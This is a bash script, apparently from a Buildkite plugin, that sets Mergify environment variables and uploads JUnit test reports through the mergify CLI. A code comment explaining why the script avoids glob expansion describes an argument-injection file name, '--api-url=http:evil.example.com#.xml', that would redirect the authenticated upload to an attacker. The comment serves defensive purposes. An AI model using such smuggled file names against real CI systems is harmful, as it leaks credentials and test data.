#!/bin/bash
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/shared.sh
source "${DIR}/shared.sh"

run_junit_process() {
  log_info "Processing JUnit reports..."

  local report_path
  plugin_config_required report_path REPORT_PATH

  # Export Mergify environment
  export MERGIFY_API_URL
  resolve_api_url MERGIFY_API_URL

  local token
  resolve_token token
  if [[ -n "$token" ]]; then
    export MERGIFY_TOKEN="$token"
  fi

  # MERGIFY_TEST_JOB_NAME is the only name mergify-cli reads for this; it has
  # no CLI flag, so the env var is the whole interface. Exporting the
  # near-miss MERGIFY_JOB_NAME instead fails silently — the CLI just falls
  # back to the auto-detected step label — so the property looks wired up
  # while doing nothing.
  local job_name
  plugin_config job_name JOB_NAME "${BUILDKITE_LABEL:-}"
  if [[ -n "$job_name" ]]; then
    export MERGIFY_TEST_JOB_NAME="$job_name"
  fi

  # Map Buildkite command exit status to mergify test exit code
  local exit_status="${BUILDKITE_COMMAND_EXIT_STATUS:-}"
  if [[ -n "$exit_status" ]]; then
    if [[ "$exit_status" == "0" ]]; then
      export MERGIFY_TEST_EXIT_CODE="0"
    else
      export MERGIFY_TEST_EXIT_CODE="1"
    fi
  fi

  # Split on whitespace only, never glob: bash expanding a leading-wildcard
  # report_path turns a build-produced file named e.g.
  # `--api-url=http:evil.example.com#.xml` into an argv entry the CLI parses
  # as an option, sending the authenticated upload to the attacker. The CLI
  # expands the patterns itself, and `--` covers what is left.
  #
  # `-d ''` reads every line, not just the first, so the blank check in
  # plugin_config_required means this yields at least one path. It has to: an
  # empty "${report_paths[@]}" is an unbound variable under `set -u` before
  # bash 4.4, and macOS agents run bash 3.2. read fails at the end of input
  # with no NUL to stop at, hence `|| true`.
  local -a report_paths
  read -r -d '' -a report_paths <<<"$report_path" || true

  # Run junit-process. The CLI's own output explains upload and
  # quarantine status; propagate its exit code so the Buildkite step
  # fails when quarantine evaluation says it should.
  mergify ci junit-process -- "${report_paths[@]}"
}
